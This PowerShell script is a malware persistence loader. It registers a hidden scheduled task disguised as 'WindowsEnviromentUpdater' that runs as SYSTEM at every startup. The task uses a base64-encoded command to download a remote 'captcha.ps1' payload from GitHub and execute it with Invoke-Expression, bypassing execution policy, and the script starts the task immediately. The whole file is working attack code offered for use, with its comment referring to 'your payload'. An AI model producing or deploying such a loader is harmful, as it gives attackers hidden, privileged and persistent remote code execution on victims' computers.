$TaskName = "WindowsEnviromentUpdater"
$GitHubUrl = "https://raw.githubusercontent.com/joault/powershell/main/captcha.ps1"

# Inner command: downloads and executes your payload from GitHub
$InnerCommand = @"
`$ProgressPreference = 'SilentlyContinue'
Invoke-Expression (Invoke-WebRequest '$GitHubUrl' -UseBasicParsing).Content
"@

# Encode inner command to avoid quoting issues
$InnerBytes = [System.Text.Encoding]::Unicode.GetBytes($InnerCommand)
$InnerBase64 = [Convert]::ToBase64String($InnerBytes)

# Build scheduled task action
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand $InnerBase64"

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Compatibility Win8 -Hidden
$Trigger = New-ScheduledTaskTrigger -AtStartup

# Remove old task if exists
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Register the task to run at every boot
Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -Settings $Settings -Trigger $Trigger -Force

# Run the task immediately
Start-ScheduledTask -TaskName $TaskName
